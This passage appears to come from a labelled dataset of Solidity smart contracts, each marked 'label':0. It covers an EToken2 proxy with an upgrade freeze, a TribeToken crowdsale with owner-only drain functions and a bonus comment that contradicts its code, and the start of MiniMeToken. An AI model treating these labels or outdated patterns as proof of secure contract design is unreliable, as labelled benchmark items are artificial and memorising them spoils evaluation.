_value) returns(bool) {\r\r\n        return transferFromWithReference(_from, _to, _value, &#39;&#39;);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Prforms allowance transfer of asset balance between holders adding specified comment.\r\r\n     * Resolves asset implementation contract for the caller and forwards there arguments along with\r\r\n     * the caller address.\r\r\n     *\r\r\n     * @param _from holder address to take from.\r\r\n     * @param _to holder address to give to.\r\r\n     * @param _value amount to transfer.\r\r\n     * @param _reference transfer comment to be included in a EToken2&#39;s Transfer event.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function transferFromWithReference(address _from, address _to, uint _value, string _reference) returns(bool) {\r\r\n        return _getAsset()._performTransferFromWithReference(_from, _to, _value, _reference, msg.sender);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Performs transfer call on the EToken2 by the name of specified sender.\r\r\n     *\r\r\n     * Can only be called by asset implementation contract assigned to sender.\r\r\n     *\r\r\n     * @param _from holder address to take from.\r\r\n     * @param _to holder address to give to.\r\r\n     * @param _value amount to transfer.\r\r\n     * @param _reference transfer comment to be included in a EToken2&#39;s Transfer event.\r\r\n     * @param _sender initial caller.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function _forwardTransferFromWithReference(address _from, address _to, uint _value, string _reference, address _sender) onlyImplementationFor(_sender) returns(bool) {\r\r\n        return etoken2.proxyTransferFromWithReference(_from, _to, _value, etoken2Symbol, _reference, _sender);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Prforms allowance transfer of asset balance between holders.\r\r\n     *\r\r\n     * @param _from holder address to take from.\r\r\n     * @param _icap recipient ICAP address to give to.\r\r\n     * @param _value amount to transfer.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function transferFromToICAP(address _from, bytes32 _icap, uint _value) returns(bool) {\r\r\n        return transferFromToICAPWithReference(_from, _icap, _value, &#39;&#39;);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Prforms allowance transfer of asset balance between holders adding specified comment.\r\r\n     * Resolves asset implementation contract for the caller and forwards there arguments along with\r\r\n     * the caller address.\r\r\n     *\r\r\n     * @param _from holder address to take from.\r\r\n     * @param _icap recipient ICAP address to give to.\r\r\n     * @param _value amount to transfer.\r\r\n     * @param _reference transfer comment to be included in a EToken2&#39;s Transfer event.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function transferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool) {\r\r\n        return _getAsset()._performTransferFromToICAPWithReference(_from, _icap, _value, _reference, msg.sender);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Performs allowance transfer to ICAP call on the EToken2 by the name of specified sender.\r\r\n     *\r\r\n     * Can only be called by asset implementation contract assigned to sender.\r\r\n     *\r\r\n     * @param _from holder address to take from.\r\r\n     * @param _icap recipient ICAP address to give to.\r\r\n     * @param _value amount to transfer.\r\r\n     * @param _reference transfer comment to be included in a EToken2&#39;s Transfer event.\r\r\n     * @param _sender initial caller.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function _forwardTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference, address _sender) onlyImplementationFor(_sender) returns(bool) {\r\r\n        return etoken2.proxyTransferFromToICAPWithReference(_from, _icap, _value, _reference, _sender);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Sets asset spending allowance for a specified spender.\r\r\n     * Resolves asset implementation contract for the caller and forwards there arguments along with\r\r\n     * the caller address.\r\r\n     *\r\r\n     * @param _spender holder address to set allowance to.\r\r\n     * @param _value amount to allow.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function approve(address _spender, uint _value) returns(bool) {\r\r\n        return _getAsset()._performApprove(_spender, _value, msg.sender);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Performs allowance setting call on the EToken2 by the name of specified sender.\r\r\n     *\r\r\n     * Can only be called by asset implementation contract assigned to sender.\r\r\n     *\r\r\n     * @param _spender holder address to set allowance to.\r\r\n     * @param _value amount to allow.\r\r\n     * @param _sender initial caller.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function _forwardApprove(address _spender, uint _value, address _sender) onlyImplementationFor(_sender) returns(bool) {\r\r\n        return etoken2.proxyApprove(_spender, _value, etoken2Symbol, _sender);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Emits ERC20 Transfer event on this contract.\r\r\n     *\r\r\n     * Can only be, and, called by assigned EToken2 when asset transfer happens.\r\r\n     *\/\r\r\n    function emitTransfer(address _from, address _to, uint _value) onlyEToken2() {\r\r\n        Transfer(_from, _to, _value);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Emits ERC20 Approval event on this contract.\r\r\n     *\r\r\n     * Can only be, and, called by assigned EToken2 when asset allowance set happens.\r\r\n     *\/\r\r\n    function emitApprove(address _from, address _spender, uint _value) onlyEToken2() {\r\r\n        Approval(_from, _spender, _value);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Resolves asset implementation contract for the caller and forwards there transaction data,\r\r\n     * along with the value. This allows for proxy interface growth.\r\r\n     *\/\r\r\n    function () payable {\r\r\n        bytes32 result = _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);\r\r\n        assembly {\r\r\n            mstore(0, result)\r\r\n            return(0, 32)\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Indicates an upgrade freeze-time start, and the next asset implementation contract.\r\r\n     *\/\r\r\n    event UpgradeProposal(address newVersion);\r\r\n\r\r\n    \/\/ Current asset implementation contract address.\r\r\n    address latestVersion;\r\r\n\r\r\n    \/\/ Proposed next asset implementation contract address.\r\r\n    address pendingVersion;\r\r\n\r\r\n    \/\/ Upgrade freeze-time start.\r\r\n    uint pendingVersionTimestamp;\r\r\n\r\r\n    \/\/ Timespan for users to review the new implementation and make decision.\r\r\n    uint constant UPGRADE_FREEZE_TIME = 3 days;\r\r\n\r\r\n    \/\/ Asset implementation contract address that user decided to stick with.\r\r\n    \/\/ 0x0 means that user uses latest version.\r\r\n    mapping(address => address) userOptOutVersion;\r\r\n\r\r\n    \/**\r\r\n     * Only asset implementation contract assigned to sender is allowed to call.\r\r\n     *\/\r\r\n    modifier onlyImplementationFor(address _sender) {\r\r\n        if (getVersionFor(_sender) == msg.sender) {\r\r\n            _;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Returns asset implementation contract address assigned to sender.\r\r\n     *\r\r\n     * @param _sender sender address.\r\r\n     *\r\r\n     * @return asset implementation contract address.\r\r\n     *\/\r\r\n    function getVersionFor(address _sender) constant returns(address) {\r\r\n        return userOptOutVersion[_sender] == 0 ? latestVersion : userOptOutVersion[_sender];\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Returns current asset implementation contract address.\r\r\n     *\r\r\n     * @return asset implementation contract address.\r\r\n     *\/\r\r\n    function getLatestVersion() constant returns(address) {\r\r\n        return latestVersion;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Returns proposed next asset implementation contract address.\r\r\n     *\r\r\n     * @return asset implementation contract address.\r\r\n     *\/\r\r\n    function getPendingVersion() constant returns(address) {\r\r\n        return pendingVersion;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Returns upgrade freeze-time start.\r\r\n     *\r\r\n     * @return freeze-time start.\r\r\n     *\/\r\r\n    function getPendingVersionTimestamp() constant returns(uint) {\r\r\n        return pendingVersionTimestamp;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Propose next asset implementation contract address.\r\r\n     *\r\r\n     * Can only be called by current asset owner.\r\r\n     *\r\r\n     * Note: freeze-time should not be applied for the initial setup.\r\r\n     *\r\r\n     * @param _newVersion asset implementation contract address.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function proposeUpgrade(address _newVersion) onlyAssetOwner() returns(bool) {\r\r\n        \/\/ Should not already be in the upgrading process.\r\r\n        if (pendingVersion != 0x0) {\r\r\n            return false;\r\r\n        }\r\r\n        \/\/ New version address should be other than 0x0.\r\r\n        if (_newVersion == 0x0) {\r\r\n            return false;\r\r\n        }\r\r\n        \/\/ Don&#39;t apply freeze-time for the initial setup.\r\r\n        if (latestVersion == 0x0) {\r\r\n            latestVersion = _newVersion;\r\r\n            return true;\r\r\n        }\r\r\n        pendingVersion = _newVersion;\r\r\n        pendingVersionTimestamp = now;\r\r\n        UpgradeProposal(_newVersion);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Cancel the pending upgrade process.\r\r\n     *\r\r\n     * Can only be called by current asset owner.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function purgeUpgrade() onlyAssetOwner() returns(bool) {\r\r\n        if (pendingVersion == 0x0) {\r\r\n            return false;\r\r\n        }\r\r\n        delete pendingVersion;\r\r\n        delete pendingVersionTimestamp;\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Finalize an upgrade process setting new asset implementation contract address.\r\r\n     *\r\r\n     * Can only be called after an upgrade freeze-time.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function commitUpgrade() returns(bool) {\r\r\n        if (pendingVersion == 0x0) {\r\r\n            return false;\r\r\n        }\r\r\n        if (pendingVersionTimestamp + UPGRADE_FREEZE_TIME > now) {\r\r\n            return false;\r\r\n        }\r\r\n        latestVersion = pendingVersion;\r\r\n        delete pendingVersion;\r\r\n        delete pendingVersionTimestamp;\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Disagree with proposed upgrade, and stick with current asset implementation\r\r\n     * until further explicit agreement to upgrade.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function optOut() returns(bool) {\r\r\n        if (userOptOutVersion[msg.sender] != 0x0) {\r\r\n            return false;\r\r\n        }\r\r\n        userOptOutVersion[msg.sender] = latestVersion;\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Implicitly agree to upgrade to current and future asset implementation upgrades,\r\r\n     * until further explicit disagreement.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function optIn() returns(bool) {\r\r\n        delete userOptOutVersion[msg.sender];\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/\/ Backwards compatibility.\r\r\n    function multiAsset() constant returns(EToken2) {\r\r\n        return etoken2;\r\r\n    }\r\r\n}","label":0}
{"code":"contract ERC20Basic {\r\r\n  uint public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint);\r\r\n  function transfer(address to, uint value);\r\r\n  event Transfer(address indexed from, address indexed to, uint value);\r\r\n}\r\r\n\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) constant returns (uint);\r\r\n  function transferFrom(address from, address to, uint value);\r\r\n  function approve(address spender, uint value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\ncontract Own {\r\r\n    address public owner;\r\r\n\r\r\n    function Own() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner {\r\r\n        if (msg.sender != owner) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transferOwnership(address newOwner) onlyOwner {\r\r\n        if (newOwner != address(0)) {\r\r\n            owner = newOwner;\r\r\n        }\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract Pause is Own {\r\r\n  bool public stopped;\r\r\n\r\r\n  modifier stopInEmergency {\r\r\n    if (stopped) {\r\r\n      throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n  \r\r\n  modifier onlyInEmergency {\r\r\n    if (!stopped) {\r\r\n      throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/\/ owner call to trigger a stop state\r\r\n  function emergencyStop() external onlyOwner {\r\r\n    stopped = true;\r\r\n  }\r\r\n\r\r\n  \/\/ owner call to restart from the stop state\r\r\n  function release() external onlyOwner onlyInEmergency {\r\r\n    stopped = false;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\ncontract Puller {\r\r\n\r\r\n  using SafeMath for uint;\r\r\n  \r\r\n  mapping(address => uint) public payments;\r\r\n\r\r\n  event LogRefundETH(address to, uint value);\r\r\n\r\r\n  function asyncSend(address dest, uint amount) internal {\r\r\n    payments[dest] = payments[dest].add(amount);\r\r\n  }\r\r\n\r\r\n  \/\/ withdrwaw call for refunding balance acumilated by payee\r\r\n  function withdrawPayments() {\r\r\n    address payee = msg.sender;\r\r\n    uint payment = payments[payee];\r\r\n    \r\r\n    if (payment == 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    if (this.balance < payment) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    payments[payee] = 0;\r\r\n\r\r\n    if (!payee.send(payment)) {\r\r\n      throw;\r\r\n    }\r\r\n    LogRefundETH(payee,payment);\r\r\n  }\r\r\n}\r\r\n\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  \r\r\n  using SafeMath for uint;\r\r\n  \r\r\n  mapping(address => uint) balances;\r\r\n  \r\r\n  modifier onlyPayloadSize(uint size) {\r\r\n     if(msg.data.length < size + 4) {\r\r\n       throw;\r\r\n     }\r\r\n     _;\r\r\n  }\r\r\n\r\r\n  function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) {\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n  }\r\r\n\r\r\n  function balanceOf(address _owner) constant returns (uint balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n}\r\r\n\r\r\ncontract StandardToken is BasicToken, ERC20 {\r\r\n  mapping (address => mapping (address => uint)) allowed;\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) onlyPayloadSize(3 * 32) {\r\r\n    var _allowance = allowed[_from][msg.sender];\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    allowed[_from][msg.sender] = _allowance.sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n  }\r\r\n\r\r\n  function approve(address _spender, uint _value) {\r\r\n    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n  }\r\r\n\r\r\n  function allowance(address _owner, address _spender) constant returns (uint remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n}\r\r\n\r\r\ncontract Token is StandardToken, Own {\r\r\n  string public constant name = \"TribeToken\";\r\r\n  string public constant symbol = \"TRIBE\";\r\r\n  uint public constant decimals = 6;\r\r\n\r\r\n  \/\/ Token constructor\r\r\n  function Token() {\r\r\n      totalSupply = 200000000000000;\r\r\n      balances[msg.sender] = totalSupply; \/\/ send all created tokens to the owner\/creator\r\r\n  }\r\r\n\r\r\n  \/\/ Burn function to burn a set amount of tokens\r\r\n  function burner(uint _value) onlyOwner returns (bool) {\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    totalSupply = totalSupply.sub(_value);\r\r\n    Transfer(msg.sender, 0x0, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\ncontract Crowdsale is Pause, Puller {\r\r\n    \r\r\n    using SafeMath for uint;\r\r\n\r\r\n  \tstruct Backer {\r\r\n\t\tuint weiReceived; \/\/ Amount of Ether given\r\r\n\t\tuint coinSent;\r\r\n\t}\r\r\n    \r\r\n\t\/\/CONSTANTS\r\r\n\t\/\/ Minimum number of TRIBE to sell\r\r\n\tuint public constant MIN_CAP = 7500000000000; \/\/ 7,500,000 TRIBE\r\r\n\t\/\/ Maximum number of TRIBE to sell\r\r\n\tuint public constant MAX_CAP = 150000000000000; \/\/ 150,000,000 TRIBE\r\r\n\t\/\/ Minimum amount to invest\r\r\n\tuint public constant MIN_INVEST_ETHER = 100 finney; \/\/ 0.1ETH\r\r\n\t\/\/ Crowdsale period\r\r\n\tuint private constant CROWDSALE_PERIOD = 22 days; \/\/ 22 days crowdsale run\r\r\n\t\/\/ Number of TRIBE per Ether\r\r\n\tuint public constant COIN_PER_ETHER = 3000000000; \/\/ 3,000 TRIBE\r\r\n\r\r\n\r\r\n\t\/\/VARIABLES\r\r\n\t\/\/ TRIBE contract reference\r\r\n\tToken public coin;\r\r\n    \/\/ Multisig contract that will receive the Ether\r\r\n\taddress public multisigEther;\r\r\n\t\/\/ Number of Ether received\r\r\n\tuint public etherReceived;\r\r\n\t\/\/ Number of TRIBE sent to Ether contributors\r\r\n\tuint public coinSentToEther;\r\r\n  \/\/ Number of TRIBE to burn\r\r\n  uint public coinToBurn;\r\r\n\t\/\/ Crowdsale start time\r\r\n\tuint public startTime;\r\r\n\t\/\/ Crowdsale end time\r\r\n\tuint public endTime;\r\r\n \t\/\/ Is crowdsale still on going\r\r\n\tbool public crowdsaleClosed;\r\r\n\r\r\n\t\/\/ Backers Ether indexed by their Ethereum address\r\r\n\tmapping(address => Backer) public backers;\r\r\n\r\r\n\r\r\n\t\/\/MODIFIERS\r\r\n\tmodifier minCapNotReached() {\r\r\n\t\tif ((now < endTime) || coinSentToEther >= MIN_CAP ) throw;\r\r\n\t\t_;\r\r\n\t}\r\r\n\r\r\n\tmodifier respectTimeFrame() {\r\r\n\t\tif ((now < startTime) || (now > endTime )) throw;\r\r\n\t\t_;\r\r\n\t}\r\r\n\r\r\n\t\/\/EVENTS\r\r\n\tevent LogReceivedETH(address addr, uint value);\r\r\n\tevent LogCoinsEmited(address indexed from, uint amount);\r\r\n\r\r\n\t\/\/Crowdsale Constructor\r\r\n\tfunction Crowdsale(address _TRIBEAddress, address _to) {\r\r\n\t\tcoin = Token(_TRIBEAddress);\r\r\n\t\tmultisigEther = _to;\r\r\n\t}\r\r\n\t\r\r\n\t\/\/ Default function to receive ether\r\r\n\tfunction() stopInEmergency respectTimeFrame payable {\r\r\n\t\treceiveETH(msg.sender);\r\r\n\t}\r\r\n\r\r\n\t \r\r\n\t\/\/ To call to start the crowdsale\r\r\n\tfunction start() onlyOwner {\r\r\n\t\tif (startTime != 0) throw; \/\/ Crowdsale was already started\r\r\n\r\r\n\t\tstartTime = now ;            \r\r\n\t\tendTime =  now + CROWDSALE_PERIOD;    \r\r\n\t}\r\r\n\r\r\n\t\/\/ Main function on ETH receive\r\r\n\tfunction receiveETH(address beneficiary) internal {\r\r\n\t\tif (msg.value < MIN_INVEST_ETHER) throw; \/\/ Do not accept investment if the amount is lower than the minimum allowed investment\r\r\n\t\t\r\r\n\t\tuint coinToSend = bonus(msg.value.mul(COIN_PER_ETHER).div(1 ether)); \/\/ Calculate the amount of tokens to send\r\r\n\t\tif (coinToSend.add(coinSentToEther) > MAX_CAP) throw;\t\r\r\n\r\r\n\t\tBacker backer = backers[beneficiary];\r\r\n\t\tcoin.transfer(beneficiary, coinToSend); \/\/ Transfer TRIBE\r\r\n\r\r\n\t\tbacker.coinSent = backer.coinSent.add(coinToSend);\r\r\n\t\tbacker.weiReceived = backer.weiReceived.add(msg.value); \/\/ Update the total wei collected during the crowdfunding for this backer    \r\r\n\r\r\n\t\tetherReceived = etherReceived.add(msg.value); \/\/ Update the total wei collected during the crowdfunding\r\r\n\t\tcoinSentToEther = coinSentToEther.add(coinToSend);\r\r\n\r\r\n\t\t\/\/ Send events\r\r\n\t\tLogCoinsEmited(msg.sender ,coinToSend);\r\r\n\t\tLogReceivedETH(beneficiary, etherReceived); \r\r\n\t}\r\r\n\t\r\r\n\r\r\n\t\/\/ Bonus function for the first week\r\r\n\tfunction bonus(uint amount) internal constant returns (uint) {\r\r\n\t\tif (now < startTime.add(2 minutes)) return amount.add(amount.div(5));   \/\/ bonus 20%\r\r\n\t\treturn amount;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Finalize function\r\r\n\tfunction finalize() onlyOwner public {\r\r\n\r\r\n        \/\/ Check if the crowdsale has ended or if the old tokens have been sold\r\r\n    if(coinSentToEther != MAX_CAP){\r\r\n        if (now < endTime)  throw; \/\/ If Crowdsale still running\r\r\n        if (coinSentToEther < MIN_CAP && now < endTime + 7 days) throw; \/\/ If MIN_CAP is not reached donors have 7days to get refund before we can finalise\r\r\n    }\r\r\n\t\t\r\r\n\t\tif (!multisigEther.send(this.balance)) throw; \/\/ Move the remaining Ether to the multisig address\r\r\n\t\t\r\r\n\t\tuint remains = coin.balanceOf(this);\r\r\n\t\tif (remains > 0) {\r\r\n      coinToBurn = coinToBurn.add(remains);\r\r\n      \/\/ Transfer remains to owner to burn\r\r\n      coin.transfer(owner, remains);\r\r\n\t\t}\r\r\n\t\tcrowdsaleClosed = true;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Drain functions in case of unexpected issues with the smart contract.\r\r\n  \/\/ ETH drain\r\r\n\tfunction drain() onlyOwner {\r\r\n    if (!multisigEther.send(this.balance)) throw; \/\/Transfer to team multisig wallet\r\r\n\t}\r\r\n  \/\/ TOKEN drain\r\r\n  function coinDrain() onlyOwner {\r\r\n    uint remains = coin.balanceOf(this);\r\r\n    coin.transfer(owner, remains); \/\/ Transfer to owner wallet\r\r\n\t}\r\r\n\r\r\n\t\/\/ Change multisig wallet in case its needed\r\r\n\tfunction changeMultisig(address addr) onlyOwner public {\r\r\n\t\tif (addr == address(0)) throw;\r\r\n\t\tmultisigEther = addr;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Manually back TRIBE owner address.\r\r\n\tfunction changeTribeOwner() onlyOwner public {\r\r\n\t\tcoin.transferOwnership(owner);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Transfer remains to owner in case if impossible to do min invest\r\r\n  \/\/THIS CHANGED!!!\r\r\n\tfunction getCoinRemains() onlyOwner public {\r\r\n    uint remains = coin.balanceOf(this);\r\r\n\r\r\n\t\tif(MIN_CAP < coinSentToEther) throw;\r\r\n\r\r\n\t\tBacker backer = backers[owner];\r\r\n\t\tcoin.transfer(owner, remains); \/\/ Transfer TRIBE right now \r\r\n\r\r\n\t\tbacker.coinSent = backer.coinSent.add(remains);\r\r\n\r\r\n\t\tcoinSentToEther = coinSentToEther.add(remains);\r\r\n\r\r\n\t\t\/\/ Send events\r\r\n\t\tLogCoinsEmited(this ,remains);\r\r\n\t\tLogReceivedETH(owner, etherReceived);\r\r\n\t}\r\r\n\r\r\n\r\r\n\t\/\/Refund function when minimum cap isnt reached, this is step is step 2, THIS FUNCTION ONLY AVAILABLE IF MIN CAP NOT REACHED.\r\r\n  \/\/STEP1: From TRIBE token contract use \"approve\" function with the amount of TRIBE you got in total.\r\r\n  \/\/STEP2: From TRIBE crowdsale contract use \"refund\" function with the amount of TRIBE you got in total.\r\r\n  \/\/STEP3: From TRIBE crowdsale contract use \"withdrawPayement\" function to recieve the ETH.\r\r\n\tfunction refund(uint _value) minCapNotReached public {\r\r\n\t\t\r\r\n\t\tif (_value != backers[msg.sender].coinSent) throw; \/\/ compare value from backer balance\r\r\n\r\r\n\t\tcoin.transferFrom(msg.sender, address(this), _value); \/\/ get the token back to the crowdsale contract\r\r\n\r\r\n\t\tuint ETHToSend = backers[msg.sender].weiReceived;\r\r\n\t\tbackers[msg.sender].weiReceived=0;\r\r\n\r\r\n\t\tif (ETHToSend > 0) {\r\r\n\t\t\tasyncSend(msg.sender, ETHToSend); \/\/ pull payment to get refund in ETH\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n}\r\r\n\r\r\nlibrary SafeMath {\r\r\n  function mul(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n  function div(uint a, uint b) internal returns (uint) {\r\r\n    assert(b > 0);\r\r\n    uint c = a \/ b;\r\r\n    assert(a == b * c + a % b);\r\r\n    return c;\r\r\n  }\r\r\n  function sub(uint a, uint b) internal returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n  function add(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n  function assert(bool assertion) internal {\r\r\n    if (!assertion) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.13;\r\r\n\r\r\n\/*\r\r\n    Copyright 2016, Jordi Baylina\r\r\n\r\r\n    This program is free software: you can redistribute it and\/or modify\r\r\n    it under the terms of the GNU General Public License as published by\r\r\n    the Free Software Foundation, either version 3 of the License, or\r\r\n    (at your option) any later version.\r\r\n\r\r\n    This program is distributed in the hope that it will be useful,\r\r\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\r\r\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\r\n    GNU General Public License for more details.\r\r\n\r\r\n    You should have received a copy of the GNU General Public License\r\r\n    along with this program.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\r\r\n *\/\r\r\n\r\r\n\/\/ Abstract contract for the full ERC 20 Token standard\r\r\n\/\/ https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n\r\r\ncontract ERC20Token {\r\r\n    \/* This is a slight change to the ERC20 base standard.\r\r\n    function totalSupply() constant returns (uint256 supply);\r\r\n    is replaced with:\r\r\n    uint256 public totalSupply;\r\r\n    This automatically creates a getter function for the totalSupply.\r\r\n    This is moved to the base contract since public getter functions are not\r\r\n    currently recognised as an implementation of the matching abstract\r\r\n    function by the compiler.\r\r\n    *\/\r\r\n    \/\/\/ total amount of tokens\r\r\n    uint256 public totalSupply;\r\r\n\r\r\n    \/\/\/ @param _owner The address from which the balance will be retrieved\r\r\n    \/\/\/ @return The balance\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `msg.sender`\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\r\n    \/\/\/ @param _from The address of the sender\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @notice `msg.sender` approves `_spender` to spend `_value` tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @param _value The amount of tokens to be approved for transfer\r\r\n    \/\/\/ @return Whether the approval was successful or not\r\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @param _owner The address of the account owning tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @return Amount of remaining tokens allowed to spent\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/\/\/ @title MiniMeToken Contract\r\r\n\/\/\/ @author Jordi Baylina\r\r\n\/\/\/ @dev This token contract&#39;s goal is to make it easy for anyone to clone this\r\r\n\/\/\/  token using the token distribution at a given block, this will allow DAO&#39;s\r\r\n\/\/\/  and DApps to upgrade their features in a decentralized manner without\r\r\n\/\/\/  affecting the original token\r\r\n\/\/\/ @dev It is ERC20 compliant, but still needs to under go further testing.\r\r\n\r\r\n\r\r\n\/\/\/ @dev The token controller contract must implement these functions\r\r\ncontract TokenController {\r\r\n    \/\/\/ @notice Called when `_owner` sends ether to the MiniMe Token contract\r\r\n    \/\/\/ @param _owner The address that sent the ether to create tokens\r\r\n    \/\/\/ @return True if the ether is accepted, false if it throws\r\r\n    function proxyPayment(address _owner) payable returns(bool);\r\r\n\r\r\n    \/\/\/ @notice Notifies the controller about a token transfer allowing the\r\r\n    \/\/\/  controller to react if desired\r\r\n    \/\/\/ @param _from The origin of the transfer\r\r\n    \/\/\/ @param _to The destination of the transfer\r\r\n    \/\/\/ @param _amount The amount of the transfer\r\r\n    \/\/\/ @return False if the controller does not authorize the transfer\r\r\n    function onTransfer(address _from, address _to, uint _amount) returns(bool);\r\r\n\r\r\n    \/\/\/ @notice Notifies the controller about an approval allowing the\r\r\n    \/\/\/  controller to react if desired\r\r\n    \/\/\/ @param _owner The address that calls `approve()`\r\r\n    \/\/\/ @param _spender The spender in the `approve()` call\r\r\n    \/\/\/ @param _amount The amount in the `approve()` call\r\r\n    \/\/\/ @return False if the controller does not authorize the approval\r\r\n    function onApprove(address _owner, address _spender, uint _amount)\r\r\n        returns(bool);\r\r\n}\r\r\n\r\r\ncontract Controlled {\r\r\n    \/\/\/ @notice The address of the controller is the only address that can call\r\r\n    \/\/\/  a function with this modifier\r\r\n    modifier onlyController { if (msg.sender != controller) throw; _; }\r\r\n\r\r\n    